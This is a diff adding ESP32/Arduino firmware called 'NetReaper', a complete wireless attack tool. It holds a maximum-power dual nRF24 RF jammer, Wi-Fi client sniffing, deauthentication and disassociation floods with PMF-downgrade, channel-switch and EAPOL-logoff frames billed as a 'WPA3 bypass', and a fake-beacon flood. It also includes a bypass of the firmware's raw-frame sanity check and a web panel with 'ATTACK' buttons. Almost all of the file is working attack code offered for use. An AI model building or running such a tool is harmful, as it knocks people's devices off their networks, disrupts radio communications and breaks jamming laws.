@@ -1,0 +1,516 @@
+#include <SPI.h>
+#include <RF24.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include "esp_bt.h"
+#include "esp_wifi.h"
+#include "esp_system.h"
+#include "esp_timer.h"
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }
+
+const int rfButtonPin = 4, rfLedPin = 2;
+const int deauthButtonPin = 5, deauthLedPin = 32;
+
+bool isJamming=false, isDeauthing=false, isBeaconing=false, scanExecuted=false;
+bool isWebRfJamming=false;
+unsigned long rfJamStartTime=0, currentWebJamDuration=0;
+
+WebServer server(80);
+const char* apSSID="NetReaper_Control";
+const char* apPassword="admin12345";
+String networkListHTML="", targetSSID="";
+
+SPIClass *sp=nullptr, *hp=nullptr;
+RF24 radio(27,15,16000000);
+RF24 radio1(22,21,16000000);
+int ch=45, ch1=45;
+
+struct WiFiNetwork{String ssid;uint8_t bssid[6];int channel;int rssi;};
+int networkCount=0, targetChannel=1;
+uint8_t targetBSSID[6];
+WiFiNetwork scannedNetworks[20];
+uint16_t seqNum=0;
+uint8_t beaconPacket[150];
+int currentBeaconChannel=1;
+uint8_t capturedClients[20][6];
+int capturedClientCount=0;
+
+// NEW: Global sniffed clients for scan display
+struct SniffedClient{uint8_t bssid[6];uint8_t client[6];};
+SniffedClient globalSniffedClients[50];
+int globalSniffedCount=0;
+
+String getVendorName(uint8_t* mac){
+  char p[9];sprintf(p,"%02X:%02X:%02X",mac[0],mac[1],mac[2]);
+  String s=String(p);
+  if(s.startsWith("00:1A:11")||s.startsWith("00:1B:63")||s.startsWith("00:25:00")||s.startsWith("00:26:BB")||s.startsWith("00:50:E4")||s.startsWith("00:0A:95")||s.startsWith("00:16:CB")||s.startsWith("00:17:F2")||s.startsWith("00:19:E3")||s.startsWith("00:1D:4F")||s.startsWith("00:1E:C2")||s.startsWith("00:25:90")||s.startsWith("F0:18:E3")||s.startsWith("3C:22:FB")||s.startsWith("A0:18:E3")||s.startsWith("DC:A6:32")) return "Apple";
+  if(s.startsWith("00:12:FB")||s.startsWith("00:15:99")||s.startsWith("00:16:32")||s.startsWith("00:1B:4B")||s.startsWith("00:1D:F6")||s.startsWith("00:21:19")||s.startsWith("00:24:54")||s.startsWith("00:26:37")||s.startsWith("00:30:91")||s.startsWith("5C:0A:5B")) return "Samsung";
+  if(s.startsWith("8C:77:12")||s.startsWith("4C:66:41")||s.startsWith("0C:1D:AF")||s.startsWith("00:08:22")||s.startsWith("00:15:AF")||s.startsWith("00:1F:13")||s.startsWith("00:1E:10")||s.startsWith("00:24:E9")) return "Xiaomi";
+  if(s.startsWith("00:0C:43")||s.startsWith("00:11:24")||s.startsWith("00:14:A7")||s.startsWith("00:16:B6")||s.startsWith("00:18:3F")||s.startsWith("00:1A:73")||s.startsWith("00:1C:1B")||s.startsWith("00:1E:E5")) return "OnePlus";
+  if(s.startsWith("F8:8A:5E")||s.startsWith("E0:B5:5F")) return "Google";
+  if(s.startsWith("DC:A6:32")||s.startsWith("B8:27:EB")) return "R-Pi";
+  if(s.startsWith("24:0A:64")||s.startsWith("3C:71:37")||s.startsWith("24:6F:28")) return "ESP";
+  return "Unknown";
+}
+
+void stopDeauth(),startJamming(),stopJamming(),sendBeacon(int);
+void startBeaconFlood(),stopBeaconFlood(),initRF24Configs();
+void sendPowerfulDeauth(),sendCSAAttack(),sendEAPOLLogoff();
+void sendPMFDowngradeBeacon(),snifferCallback(void*,wifi_promiscuous_pkt_type_t);
+
+// ===== RF JAMMER =====
+void startJamming(){
+  Serial.println("\n>>> MAX POWER JAMMER ON (CONST CARRIER)");
+  digitalWrite(rfLedPin,HIGH);
+  WiFi.mode(WIFI_OFF);delay(100);esp_wifi_stop();btStop();delay(50);server.stop();
+  radio.powerUp();radio1.powerUp();initRF24Configs();
+  radio.startConstCarrier(RF24_PA_MAX,ch);
+  radio1.startConstCarrier(RF24_PA_MAX,ch1);
+}
+void aggressiveRandomMode(){radio1.setChannel(random(2,80));radio.setChannel(random(2,80));}
+void stopJamming(){
+  digitalWrite(rfLedPin,LOW);
+  radio.powerDown();radio1.powerDown();delay(750);
+  WiFi.mode(WIFI_OFF);delay(200);WiFi.mode(WIFI_AP);delay(150);
+  WiFi.softAP(apSSID,apPassword,1,0,4);delay(150);
+  esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+  esp_wifi_set_max_tx_power(84);esp_wifi_set_ps(WIFI_PS_NONE);
+  server.begin();isWebRfJamming=false;
+}
+void toggleJammerPhysical(){
+  isJamming=!isJamming;isWebRfJamming=false;
+  if(isJamming){if(isDeauthing)stopDeauth();if(isBeaconing)stopBeaconFlood();startJamming();}
+  else stopJamming();
+}
+void checkJammerButton(){
+  static int l=HIGH;static unsigned long lt=0;
+  int cs=digitalRead(rfButtonPin);
+  if(cs==LOW&&l==HIGH&&(millis()-lt)>300){
+    lt=millis();
+    if(isBeaconing)stopBeaconFlood();
+    else toggleJammerPhysical();
+  }
+  l=cs;
+}
+
+// ===== SNIFFER (combined scan + deauth) =====
+void snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type){
+  if(type!=WIFI_PKT_MGMT && type!=WIFI_PKT_DATA) return;
+  
+  uint8_t *p=((wifi_promiscuous_pkt_t*)buf)->payload;
+  uint8_t *src=p+10, *dst=p+4, *bssid=p+16;
+  uint8_t *clientMac=nullptr, *apMac=nullptr;
+
+  if(memcmp(src,bssid,6)==0){clientMac=dst;apMac=bssid;}
+  else if(memcmp(dst,bssid,6)==0){clientMac=src;apMac=bssid;}
+
+  if(clientMac&&apMac){
+    if(clientMac[0]==0xFF&&clientMac[1]==0xFF) return;
+    if(clientMac[0]==0x33&&clientMac[1]==0x33) return;
+
+    // Global list (for scan display)
+    bool exists=false;
+    for(int i=0;i<globalSniffedCount;i++){
+      if(memcmp(globalSniffedClients[i].client,clientMac,6)==0){exists=true;break;}
+    }
+    if(!exists&&globalSniffedCount<50){
+      memcpy(globalSniffedClients[globalSniffedCount].client,clientMac,6);
+      memcpy(globalSniffedClients[globalSniffedCount].bssid,apMac,6);
+      globalSniffedCount++;
+    }
+
+    // Deauth target clients
+    if(isDeauthing&&memcmp(apMac,targetBSSID,6)==0){
+      bool ex=false;
+      for(int i=0;i<capturedClientCount;i++){
+        if(memcmp(capturedClients[i],clientMac,6)==0){ex=true;break;}
+      }
+      if(!ex&&capturedClientCount<20){
+        memcpy(capturedClients[capturedClientCount],clientMac,6);
+        capturedClientCount++;
+      }
+    }
+  }
+}
+
+// ===== SCAN (with client counting) =====
+void startWiFiScan(){
+  Serial.println("[*] Scanning & Sniffing Clients...");
+  WiFi.mode(WIFI_AP_STA);WiFi.disconnect(true);delay(100);
+
+  globalSniffedCount=0;
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
+
+  networkCount=WiFi.scanNetworks(false,true);
+
+  // Store results immediately
+  if(networkCount>0){
+    for(int i=0;i<networkCount&&i<20;i++){
+      scannedNetworks[i].ssid=WiFi.SSID(i);
+      memcpy(scannedNetworks[i].bssid,WiFi.BSSID(i),6);
+      scannedNetworks[i].channel=WiFi.channel(i);
+      scannedNetworks[i].rssi=WiFi.RSSI(i);
+    }
+  }
+
+  // Extra per-channel sniffing for accurate counts
+  Serial.println("[*] Extra sniffing 1-13...");
+  for(int c=1;c<=13;c++){
+    esp_wifi_set_channel(c,WIFI_SECOND_CHAN_NONE);
+    delay(300);
+  }
+
+  esp_wifi_set_promiscuous(false);delay(50);
+  WiFi.mode(WIFI_AP);delay(50);
+
+  // Build HTML with client counts
+  networkListHTML="";
+  if(networkCount>0){
+    for(int i=0;i<networkCount&&i<20;i++){
+      int cCount=0;
+      for(int j=0;j<globalSniffedCount;j++){
+        if(memcmp(scannedNetworks[i].bssid,globalSniffedClients[j].bssid,6)==0) cCount++;
+      }
+      String s=scannedNetworks[i].ssid;
+      if(s.length()==0) s="<i>Hidden</i>";
+      s.replace("<","&lt;");s.replace(">","&gt;");
+      String cc=cCount>0?"#0f0":"#666";
+      String rc="#0f0";
+      if(scannedNetworks[i].rssi<-50) rc="#ff0";
+      if(scannedNetworks[i].rssi<-65) rc="#f80";
+      if(scannedNetworks[i].rssi<-75) rc="#f00";
+      networkListHTML+="<tr><td>["+String(i)+"]</td>";
+      networkListHTML+="<td style='text-align:left;'><b>"+s+"</b>";
+      networkListHTML+="<br><span style='color:#666;font-size:11px;'>Ch:"+String(scannedNetworks[i].channel);
+      networkListHTML+=" | <span style='color:"+rc+";'>"+String(scannedNetworks[i].rssi)+"dBm</span></span></td>";
+      networkListHTML+="<td><b style='color:"+cc+";'>"+String(cCount)+"</b></td>";
+      networkListHTML+="<td><a href='/deauth?idx="+String(i)+"' class='btn-attack'>ATTACK</a></td></tr>";
+    }
+  } else networkListHTML="<tr><td colspan='4'>No networks!</td></tr>";
+  scanExecuted=true;
+  Serial.printf("[*] Done: %d networks, %d clients\n",networkCount,globalSniffedCount);
+}
+
+// ===== DEAUTH (SAME - effective) =====
+void startDeauth(int index){
+  if(index<0||index>=networkCount) return;
+  memcpy(targetBSSID,scannedNetworks[index].bssid,6);
+  targetChannel=scannedNetworks[index].channel;
+  targetSSID=scannedNetworks[index].ssid;
+  WiFi.mode(WIFI_AP_STA);delay(100);
+  esp_wifi_set_max_tx_power(84);esp_wifi_set_ps(WIFI_PS_NONE);
+  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);delay(50);
+  esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+  esp_wifi_set_protocol(WIFI_IF_STA,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
+  seqNum=0;capturedClientCount=0;
+  digitalWrite(deauthLedPin,HIGH);isDeauthing=true;
+  Serial.printf("[*] ULTRA DEAUTH: '%s' Ch:%d\n",targetSSID.c_str(),targetChannel);
+}
+
+void sendPMFDowngradeBeacon(){
+  uint8_t pkt[128];
+  pkt[0]=0x80;pkt[1]=0;pkt[2]=0;pkt[3]=0;
+  memset(&pkt[4],0xFF,6);
+  memcpy(&pkt[10],targetBSSID,6);
+  memcpy(&pkt[16],targetBSSID,6);
+  uint16_t sc=(seqNum&0x0FFF)<<4;
+  pkt[22]=sc&0xFF;pkt[23]=(sc>>8)&0xFF;
+  seqNum=(seqNum+1)&0x0FFF;
+  uint64_t ts=esp_timer_get_time();
+  memcpy(&pkt[24],&ts,8);
+  pkt[32]=0x64;pkt[33]=0;pkt[34]=0x31;pkt[35]=0x04;
+  int o=36;
+  pkt[o++]=0;pkt[o++]=0;
+  pkt[o++]=0x30;pkt[o++]=0x14;
+  pkt[o++]=1;pkt[o++]=0;
+  pkt[o++]=0;pkt[o++]=0;pkt[o++]=0x0F;pkt[o++]=0xAC;pkt[o++]=4;
+  pkt[o++]=1;pkt[o++]=0;
+  pkt[o++]=0;pkt[o++]=0;pkt[o++]=0x0F;pkt[o++]=0xAC;pkt[o++]=4;
+  pkt[o++]=1;pkt[o++]=0;
+  pkt[o++]=0;pkt[o++]=0;pkt[o++]=0x0F;pkt[o++]=0xAC;pkt[o++]=2;
+  pkt[o++]=0;pkt[o++]=0;
+  for(int i=0;i<10;i++){
+    esp_wifi_80211_tx(WIFI_IF_AP,pkt,o,false);
+    esp_wifi_80211_tx(WIFI_IF_STA,pkt,o,false);
+  }
+}
+
+void sendCSAAttack(){
+  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  uint8_t ic[]={255,14,100,165,200,0,13,12};
+  uint8_t c[29];
+  c[0]=0xD0;c[1]=0;c[2]=0x3A;c[3]=1;
+  memcpy(&c[4],bc,6);memcpy(&c[10],targetBSSID,6);memcpy(&c[16],targetBSSID,6);
+  c[24]=0;c[25]=4;c[26]=1;c[28]=0;
+  for(int ch=0;ch<8;ch++){
+    c[27]=ic[ch];
+    for(int i=0;i<10;i++){
+      uint16_t sc=(seqNum&0x0FFF)<<4;
+      c[22]=sc&0xFF;c[23]=(sc>>8)&0xFF;
+      seqNum=(seqNum+1)&0x0FFF;
+      esp_wifi_80211_tx(WIFI_IF_AP,c,29,false);
+      esp_wifi_80211_tx(WIFI_IF_STA,c,29,false);
+    }
+  }
+  for(int c2=0;c2<capturedClientCount&&c2<20;c2++){
+    memcpy(&c[4],capturedClients[c2],6);
+    c[27]=255;
+    for(int r=0;r<5;r++){
+      uint16_t sc=(seqNum&0x0FFF)<<4;
+      c[22]=sc&0xFF;c[23]=(sc>>8)&0xFF;
+      seqNum=(seqNum+1)&0x0FFF;
+      esp_wifi_80211_tx(WIFI_IF_AP,c,29,false);
+    }
+  }
+}
+
+void sendEAPOLLogoff(){
+  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  uint8_t e[38];
+  e[0]=8;e[1]=0;e[2]=0x3A;e[3]=1;
+  memcpy(&e[4],targetBSSID,6);memcpy(&e[10],bc,6);memcpy(&e[16],targetBSSID,6);
+  e[24]=0xAA;e[25]=0xAA;e[26]=3;e[27]=0;e[28]=0;e[29]=0;
+  e[30]=0x88;e[31]=0x8E;e[32]=1;e[33]=2;e[34]=0;e[35]=4;e[36]=0;e[37]=0;
+  for(int c=0;c<capturedClientCount&&c<20;c++){
+    memcpy(&e[10],capturedClients[c],6);
+    uint16_t sc=(seqNum&0x0FFF)<<4;
+    e[22]=sc&0xFF;e[23]=(sc>>8)&0xFF;
+    seqNum=(seqNum+1)&0x0FFF;
+    for(int r=0;r<5;r++) esp_wifi_80211_tx(WIFI_IF_AP,e,38,false);
+  }
+}
+
+void sendPowerfulDeauth(){
+  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);
+  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  uint8_t rc[]={1,2,4,5,6,7,8,0xC,0xD,0xF,0x18,0x1C,0x28};
+  int nr=13;
+  uint8_t p[4][26];
+  p[0][0]=0xC0;p[1][0]=0xC0;p[2][0]=0xA0;p[3][0]=0xA0;
+  for(int v=0;v<4;v++){p[v][1]=0;p[v][2]=0x3A;p[v][3]=1;}
+  memcpy(&p[0][4],bc,6);memcpy(&p[0][10],targetBSSID,6);memcpy(&p[0][16],targetBSSID,6);
+  memcpy(&p[1][4],targetBSSID,6);memcpy(&p[1][10],bc,6);memcpy(&p[1][16],targetBSSID,6);
+  memcpy(&p[2][4],bc,6);memcpy(&p[2][10],targetBSSID,6);memcpy(&p[2][16],targetBSSID,6);
+  memcpy(&p[3][4],targetBSSID,6);memcpy(&p[3][10],bc,6);memcpy(&p[3][16],targetBSSID,6);
+  
+  sendPMFDowngradeBeacon();
+  
+  for(int i=0;i<50;i++){
+    uint8_t r=rc[i%nr];
+    p[0][24]=r;p[1][24]=r;p[2][24]=r;p[3][24]=r;
+    p[0][25]=0;p[1][25]=0;p[2][25]=0;p[3][25]=0;
+    uint16_t s0=(seqNum&0x0FFF)<<4,s1=((seqNum+1)&0x0FFF)<<4,s2=((seqNum+2)&0x0FFF)<<4,s3=((seqNum+3)&0x0FFF)<<4;
+    p[0][22]=s0&0xFF;p[0][23]=(s0>>8)&0xFF;
+    p[1][22]=s1&0xFF;p[1][23]=(s1>>8)&0xFF;
+    p[2][22]=s2&0xFF;p[2][23]=(s2>>8)&0xFF;
+    p[3][22]=s3&0xFF;p[3][23]=(s3>>8)&0xFF;
+    seqNum=(seqNum+4)&0x0FFF;
+    esp_wifi_80211_tx(WIFI_IF_AP,p[0],26,false);
+    esp_wifi_80211_tx(WIFI_IF_AP,p[1],26,false);
+    esp_wifi_80211_tx(WIFI_IF_AP,p[2],26,false);
+    esp_wifi_80211_tx(WIFI_IF_AP,p[3],26,false);
+    esp_wifi_80211_tx(WIFI_IF_STA,p[0],26,false);
+    esp_wifi_80211_tx(WIFI_IF_STA,p[1],26,false);
+    if(i%20==0)delay(1);
+  }
+  
+  for(int c=0;c<capturedClientCount&&c<20;c++){
+    uint8_t dc[26];dc[0]=0xC0;dc[1]=0;dc[2]=0x3A;dc[3]=1;
+    memcpy(&dc[4],capturedClients[c],6);memcpy(&dc[10],targetBSSID,6);memcpy(&dc[16],targetBSSID,6);
+    dc[24]=7;dc[25]=0;
+    uint16_t s=(seqNum&0x0FFF)<<4;dc[22]=s&0xFF;dc[23]=(s>>8)&0xFF;
+    seqNum=(seqNum+1)&0x0FFF;
+    for(int r=0;r<10;r++){
+      esp_wifi_80211_tx(WIFI_IF_AP,dc,26,false);
+      esp_wifi_80211_tx(WIFI_IF_STA,dc,26,false);
+    }
+  }
+  
+  sendCSAAttack();
+  sendEAPOLLogoff();
+  sendPMFDowngradeBeacon();
+}
+
+void stopDeauth(){
+  isDeauthing=false;targetSSID="";
+  esp_wifi_set_promiscuous(false);
+  digitalWrite(deauthLedPin,LOW);
+  WiFi.mode(WIFI_AP);delay(100);
+  Serial.println("[*] Deauth Stopped!");
+}
+
+void checkDeauthButton(){
+  static int l=HIGH;static unsigned long lt=0,lpt=0;
+  int cs=digitalRead(deauthButtonPin);
+  if(cs==LOW&&l==HIGH){
+    if(millis()-lt>300){
+      lt=millis();
+      if(millis()-lpt<400){
+        if(isBeaconing)stopBeaconFlood();
+        else{
+          if(isJamming){stopJamming();isJamming=false;}
+          if(isDeauthing)stopDeauth();
+          startBeaconFlood();
+        }
+        lpt=0;
+      } else lpt=millis();
+    }
+  }
+  if(lpt!=0&&millis()-lpt>400&&cs==HIGH){
+    if(!isBeaconing){
+      if(!isDeauthing){
+        if(isJamming){stopJamming();isJamming=false;}
+        WiFi.mode(WIFI_OFF);delay(200);
+        WiFi.mode(WIFI_AP);delay(100);
+        if(!scanExecuted){startWiFiScan();if(networkCount>0)startDeauth(0);}
+        else if(networkCount>0) startDeauth(0);
+      } else stopDeauth();
+    }
+    lpt=0;
+  }
+  l=cs;
+}
+
+// ===== BEACON =====
+void startBeaconFlood(){
+  if(isJamming){isJamming=false;stopJamming();}
+  if(isDeauthing)stopDeauth();
+  isBeaconing=true;
+  digitalWrite(rfLedPin,HIGH);digitalWrite(deauthLedPin,HIGH);
+  esp_wifi_set_max_tx_power(84);
+  WiFi.mode(WIFI_AP);delay(50);
+  esp_wifi_set_promiscuous(true);
+  currentBeaconChannel=1;
+}
+void stopBeaconFlood(){
+  isBeaconing=false;
+  digitalWrite(rfLedPin,LOW);digitalWrite(deauthLedPin,LOW);
+  esp_wifi_set_promiscuous(false);
+  WiFi.mode(WIFI_AP);delay(50);
+}
+void sendBeacon(int channel){
+  uint8_t b[6];for(int i=0;i<6;i++)b[i]=esp_random()%256;b[0]&=0xFE;
+  char s[32];snprintf(s,sizeof(s),"rajdeep_%04d",(esp_random()%9000)+1000);
+  int sl=strlen(s);
+  beaconPacket[0]=0x80;beaconPacket[1]=0;beaconPacket[2]=0;beaconPacket[3]=0;
+  memset(&beaconPacket[4],0xFF,6);
+  memcpy(&beaconPacket[10],b,6);memcpy(&beaconPacket[16],b,6);
+  beaconPacket[22]=esp_random()%256;beaconPacket[23]=(esp_random()%256)&0xF0;
+  uint64_t ts=esp_timer_get_time();memcpy(&beaconPacket[24],&ts,8);
+  beaconPacket[32]=0x64;beaconPacket[33]=0;beaconPacket[34]=0x11;beaconPacket[35]=0x04;
+  int o=36;
+  beaconPacket[o++]=0;beaconPacket[o++]=sl;memcpy(&beaconPacket[o],s,sl);o+=sl;
+  beaconPacket[o++]=0x01;beaconPacket[o++]=0x0C;beaconPacket[o++]=0x82;beaconPacket[o++]=0x84;beaconPacket[o++]=0x8B;beaconPacket[o++]=0x96;beaconPacket[o++]=0x0C;beaconPacket[o++]=0x12;beaconPacket[o++]=0x18;beaconPacket[o++]=0x24;beaconPacket[o++]=0x30;beaconPacket[o++]=0x48;beaconPacket[o++]=0x60;beaconPacket[o++]=0x6C;
+  beaconPacket[o++]=0x03;beaconPacket[o++]=0x01;beaconPacket[o++]=channel;
+  beaconPacket[o++]=0x2A;beaconPacket[o++]=0x01;beaconPacket[o++]=0;
+  beaconPacket[o++]=0x32;beaconPacket[o++]=4;beaconPacket[o++]=0x6C;beaconPacket[o++]=0x6C;beaconPacket[o++]=0x6C;beaconPacket[o++]=0x6C;
+  esp_wifi_80211_tx(WIFI_IF_AP,beaconPacket,o,false);
+}
+
+// ===== WEB SERVER =====
+void handleRoot(){
+  String st="SYSTEM IDLE",sc="#00ff00",sd="";
+  if(isJamming){st="MAX POWER RF JAMMING";sc="#ffaa00";sd="<p style='color:#fff;'>GPIO 4 to stop.</p>";}
+  else if(isDeauthing){
+    st="ULTRA DEAUTH + WPA3 BYPASS";sc="#ff0000";
+    char b[18];sprintf(b,"%02X:%02X:%02X:%02X:%02X:%02X",targetBSSID[0],targetBSSID[1],targetBSSID[2],targetBSSID[3],targetBSSID[4],targetBSSID[5]);
+    sd="<div style='background:#220000;padding:15px;border-radius:8px;border:1px solid #ff0000;text-align:left;'>";
+    sd+="<p style='color:#fff;font-size:16px;'>Target: <b style='color:#ff5555;'>"+targetSSID+"</b></p>";
+    sd+="<p style='color:#aaa;font-size:13px;'>BSSID: "+String(b)+" | Ch: "+String(targetChannel)+"</p>";
+    sd+="<p style='color:#ffaa00;font-size:14px;'>Disconnected Clients ("+String(capturedClientCount)+"):</p>";
+    sd+="<div style='background:#110000;padding:8px;border-radius:5px;font-size:12px;color:#ff3333;max-height:120px;overflow-y:auto;'>";
+    if(capturedClientCount==0){sd+="<i style='color:#666;'>Sniffing for devices...</i>";}
+    else{for(int i=0;i<capturedClientCount;i++){char cm[18];sprintf(cm,"%02X:%02X:%02X:%02X:%02X:%02X",capturedClients[i][0],capturedClients[i][1],capturedClients[i][2],capturedClients[i][3],capturedClients[i][4],capturedClients[i][5]);String v=getVendorName(capturedClients[i]);sd+="&#9888; <b>["+v+"]</b> "+String(cm)+"<br>";}}
+    sd+="</div>";
+    sd+="<p style='color:#00ffff;font-size:11px;margin-top:8px;'>Vectors: Standard+PMF+CSA+EAPOL-Logoff</p>";
+    sd+="</div>";
+  }
+  else if(isBeaconing){st="BEACON FLOOD";sc="#00ffff";sd="<p style='color:#fff;'>Flooding rajdeep_XXXX.</p>";}
+  
+  String h="<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta http-equiv='refresh' content='3'><style>";
+  h+="body{background:#0a0a0a;color:#00ff00;font-family:monospace;text-align:center;padding:15px;}";
+  h+="h1{color:#ff3333;text-shadow:0 0 10px #ff0000;}";
+  h+=".sb{background:#1a1a1a;border:2px solid "+sc+";padding:20px;border-radius:10px;margin-bottom:20px;}";
+  h+=".st{font-size:1.5em;color:"+sc+";font-weight:bold;}";
+  h+=".bf{display:block;width:90%;margin:8px auto;padding:14px;font-size:16px;color:#fff;background:#222;border:2px solid #00ff00;text-decoration:none;border-radius:8px;}";
+  h+=".ba{background:#ff0000;color:#fff;padding:8px 15px;text-decoration:none;border-radius:5px;}";
+  h+=".bs{background:#330000;border-color:#ff3333;color:#ff3333;}";
+  h+="table{width:100%;border-collapse:collapse;margin-top:10px;}th,td{border:1px solid #333;padding:8px;}th{color:#00ff00;}td{color:#ccc;}";
+  h+="</style></head><body>";
+  h+="<h1>NETREAPER</h1><div class='sb'><div class='st'>"+st+"</div>"+sd+"</div>";
+  h+="<a href='/scan' class='bf'>SCAN NETWORKS</a>";
+  if(isDeauthing)h+="<a href='/deauth?idx=stop' class='bf bs'>STOP DEAUTH</a>";
+  if(isBeaconing)h+="<a href='/beacon?action=stop' class='bf bs'>STOP BEACON</a>";
+  else h+="<a href='/beacon?action=start' class='bf' style='border-color:#00ffff;color:#00ffff;'>START BEACON</a>";
+  h+="<h3 style='color:#fff;'>RF JAMMER:</h3><a href='#' class='bf' onclick='j(10)'>10s</a><a href='#' class='bf' onclick='j(30)'>30s</a><a href='#' class='bf' style='border-color:#ffaa00;color:#ffaa00;' onclick='j(0)'>UNLIMITED</a>";
+  if(networkListHTML.length()>0)h+="<h3 style='color:#fff;'>Targets:</h3><table><tr><th>ID</th><th>SSID</th><th>Clients</th><th>Action</th></tr>"+networkListHTML+"</table>";
+  h+="<script>function j(s){fetch('/rf?time='+s);}</script></body></html>";
+  server.send(200,"text/html",h);
+}
+
+void handleScan(){
+  if(isJamming)stopJamming();if(isBeaconing)stopBeaconFlood();
+  startWiFiScan();
+  server.sendHeader("Location","/",true);server.send(302);
+}
+void handleDeauth(){
+  String i=server.arg("idx");
+  if(i=="stop")stopDeauth();
+  else{int x=i.toInt();if(isJamming){stopJamming();isJamming=false;}if(isBeaconing)stopBeaconFlood();startDeauth(x);}
+  server.sendHeader("Location","/",true);server.send(302);
+}
+void handleBeacon(){
+  String a=server.arg("action");
+  if(a=="start"){if(isJamming){stopJamming();isJamming=false;}if(isDeauthing)stopDeauth();startBeaconFlood();}
+  else stopBeaconFlood();
+  server.sendHeader("Location","/",true);server.send(302);
+}
+void handleRFToggle(){
+  String t=server.arg("time");int s=t.toInt();
+  if(s>=0){if(isDeauthing)stopDeauth();if(isBeaconing)stopBeaconFlood();isJamming=true;startJamming();if(s>0){isWebRfJamming=true;currentWebJamDuration=s*1000;rfJamStartTime=millis();}else isWebRfJamming=false;}
+  server.send(200,"text/plain","OK");
+}
+void handleSerial(){
+  if(Serial.available()){
+    String c=Serial.readStringUntil('\n');c.trim();
+    if(c.equalsIgnoreCase("scan")){if(isJamming)stopJamming();if(isBeaconing)stopBeaconFlood();startWiFiScan();}
+    else if(c.startsWith("deauth ")){String a=c.substring(7);if(a=="off")stopDeauth();else{if(isJamming)stopJamming();if(isBeaconing)stopBeaconFlood();startDeauth(a.toInt());}}
+    else if(c.equalsIgnoreCase("rf"))toggleJammerPhysical();
+    else if(c.equalsIgnoreCase("beacon")){if(isBeaconing)stopBeaconFlood();else startBeaconFlood();}
+  }
+}
+
+// ===== INIT =====
+void initRF24Configs(){
+  radio.setAutoAck(false);radio.stopListening();radio.setRetries(0,0);
+  radio.setPALevel(RF24_PA_MAX,true);radio.setDataRate(RF24_2MBPS);
+  radio.setCRCLength(RF24_CRC_DISABLED);
+  radio1.setAutoAck(false);radio1.stopListening();radio1.setRetries(0,0);
+  radio1.setPALevel(RF24_PA_MAX,true);radio1.setDataRate(RF24_2MBPS);
+  radio1.setCRCLength(RF24_CRC_DISABLED);
+}
+void initSP(){sp=new SPIClass(VSPI);sp->begin(18,19,23,21);if(radio1.begin(sp)){initRF24Configs();radio1.powerDown();}}
+void initHP(){hp=new SPIClass(HSPI);hp->begin(14,12,13,15);if(radio.begin(hp)){initRF24Configs();radio.powerDown();}}
+
+void setup(){
+  Serial.begin(115200);delay(1000);setCpuFrequencyMhz(240);
+  pinMode(rfButtonPin,INPUT_PULLUP);pinMode(rfLedPin,OUTPUT);digitalWrite(rfLedPin,LOW);
+  pinMode(deauthButtonPin,INPUT_PULLUP);pinMode(deauthLedPin,OUTPUT);digitalWrite(deauthLedPin,LOW);
+  esp_wifi_set_max_tx_power(84);initHP();initSP();
+  WiFi.mode(WIFI_AP);WiFi.softAP(apSSID,apPassword,1,0,4);
+  server.on("/",handleRoot);server.on("/scan",handleScan);server.on("/deauth",handleDeauth);
+  server.on("/beacon",handleBeacon);server.on("/rf",handleRFToggle);
+  server.begin();
+  Serial.println("[*] System Ready - WPA3 BYPASS + Client Counting");
+}
+
+void loop(){
+  checkDeauthButton();checkJammerButton();
+  if(isBeaconing){server.handleClient();handleSerial();esp_wifi_set_channel(currentBeaconChannel,WIFI_SECOND_CHAN_NONE);for(int i=0;i<30;i++)sendBeacon(currentBeaconChannel);currentBeaconChannel++;if(currentBeaconChannel>13)currentBeaconChannel=1;yield();}
+  else if(isJamming){checkJammerButton();if(isWebRfJamming&&millis()-rfJamStartTime>=currentWebJamDuration){isJamming=false;stopJamming();}else aggressiveRandomMode();}
+  else{server.handleClient();handleSerial();checkJammerButton();checkDeauthButton();if(isDeauthing){sendPowerfulDeauth();delay(1);yield();}}
+}
